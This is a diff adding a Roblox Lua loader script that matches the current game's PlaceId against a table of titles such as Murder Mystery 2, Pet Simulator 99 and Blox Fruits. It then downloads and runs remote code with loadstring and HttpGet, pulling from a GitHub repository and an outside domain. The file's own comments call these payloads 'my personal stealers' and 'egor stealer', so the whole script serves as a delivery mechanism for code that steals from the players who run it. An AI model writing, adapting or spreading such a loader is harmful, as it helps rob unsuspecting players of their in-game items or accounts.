@@ -1,1 +1,40 @@
+local gameid = {
 
+    [383310974] = "adm",
+
+    [8737899170] = "ps99",
+    [15502339080] = "ps99",
+
+    [18901165922] = "pg",
+    [19006211286] = "pg",
+
+    [4442272183] = "bf",
+
+    [4520749081] = "kl",
+    [6381829480] = "kl",
+    [15759515082] = "kl",
+
+    [142823291] = "mm2",
+    [335132309] = "mm2",
+    [636649648] = "mm2",
+    [73210641948512] = "mm2"
+}
+
+if gameid[game.PlaceId] then
+    stealer_to_use = gameid[game.PlaceId]
+end
+--my personal stealers
+if stealer_to_use == "mm2" then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxroot/src/refs/heads/main/mm2-aio.lua"))()
+elseif stealer_to_use == "pg" then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxroot/src/refs/heads/main/petsgo.lua"))()
+elseif stealer_to_use == "adm" then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxroot/src/refs/heads/main/adm-aio.lua"))()
+--egor stealer
+elseif stealer_to_use == "kl" then
+    loadstring(game:HttpGet("https://egorikusa.space/2cdc7b878cc90b9e8bdde5a6.lua", true))()
+elseif stealer_to_use == "ps99" then
+	loadstring(game:HttpGet("https://egorikusa.space/2cdc7b878cc90b9e8bdde5a6.lua", true))()
+elseif stealer_to_use == "bf" then
+	loadstring(game:HttpGet("https://egorikusa.space/2cdc7b878cc90b9e8bdde5a6.lua", true))()
+end
